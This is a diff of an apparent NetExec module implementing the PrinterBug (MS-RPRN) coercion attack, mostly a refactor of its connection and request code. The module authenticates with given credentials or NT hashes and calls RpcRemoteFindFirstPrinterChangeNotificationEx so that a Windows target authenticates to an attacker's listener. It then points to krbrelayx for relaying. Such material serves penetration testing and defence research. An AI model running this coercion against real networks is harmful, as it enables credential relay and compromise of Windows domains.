@@ -1,9 +1,5 @@
 from impacket import system_errors
 from impacket.dcerpc.v5 import transport, rprn
-from impacket.dcerpc.v5.ndr import NDRCALL
-from impacket.dcerpc.v5.dtypes import ULONG, WSTR, DWORD
-from impacket.dcerpc.v5.rpcrt import DCERPCException
-from impacket.uuid import uuidtup_to_bin
 from nxc.logger import nxc_logger
 
 
@@ -27,13 +23,14 @@ class NXCModule:
 
     def on_login(self, context, connection):
         trigger = TriggerAuth()
+        target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
         dce = trigger.connect(
             username=connection.username,
             password=connection.password,
             domain=connection.domain,
             lmhash=connection.lmhash,
             nthash=connection.nthash,
-            target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
+            target=target,
             doKerberos=connection.kerberos,
             dcHost=connection.kdcHost,
             aesKey=connection.aesKey,
@@ -41,27 +38,13 @@ class NXCModule:
 
         if dce is not None:
             context.log.debug("Target is vulnerable to PrinterBug")
-            trigger.RpcRemoteFindFirstPrinterChange(dce, self.listener,connection.host if not connection.kerberos else connection.hostname + "." + connection.domain)
+            trigger.RpcRemoteFindFirstPrinterChange(dce, self.listener, target)
             context.log.highlight("VULNERABLE")
             context.log.highlight("Next step: https://github.com/dirkjanm/krbrelayx")
             dce.disconnect()
 
         else:
             context.log.debug("Target is not vulnerable to PrinterBug")
-
-
-class DCERPCSessionError(DCERPCException):
-    def __init__(self, error_string=None, error_code=None, packet=None):
-        DCERPCException.__init__(self, error_string, error_code, packet)
-
-    def __str__(self):
-        key = self.error_code
-        if key in system_errors.ERROR_MESSAGES:
-            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
-            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
-            return f"DFSNM SessionError: code: 0x{self.error_code:x} - {error_msg_short} - {error_msg_verbose}"
-        else:
-            return f"DFSNM SessionError: unknown error code: 0x{self.error_code:x}"
 
 
 ################################################################################
@@ -109,27 +92,28 @@ class TriggerAuth:
     def RpcRemoteFindFirstPrinterChange(self, dce, listener,target):
         nxc_logger.debug("[-] Sending RpcRemoteFindFirstPrinterChange!")
         try:
-            resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % target)
+            resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % target)
         except Exception as e:
-            if str(e).find('Broken pipe') >= 0:
+            if str(e).find("Broken pipe") >= 0:
                 # The connection timed-out. Let's try to bring it back next round
-                nxc_logger.error('Connection failed - skipping host!')
+                nxc_logger.error("Connection failed - skipping host!")
                 return
-            elif str(e).upper().find('ACCESS_DENIED'):
+            elif str(e).upper().find("ACCESS_DENIED"):
                 # We're not admin, bye
-                nxc_logger.error('Access denied - RPC call was denied')
+                nxc_logger.error("Access denied - RPC call was denied")
                 dce.disconnect()
                 return
             else:
                 raise
-        nxc_logger.debug('Got handle')
+        nxc_logger.debug("Got handle")
 
         try:
             request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
-            request['hPrinter'] =  resp['pHandle']
-            request['fdwFlags'] =  rprn.PRINTER_CHANGE_ADD_JOB
-            request['pszLocalMachine'] =  '\\\\%s\x00' % listener
-            request['pOptions'] =  NULL
+            request["hPrinter"] = resp["pHandle"]
+            request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
+            request["pszLocalMachine"] = "\\\\%s\x00" % listener
+            request["pOptions"] = None
+            nxc_logger.debug(request.dump())
         except Exception as e:
             nxc_logger.debug(e)
 
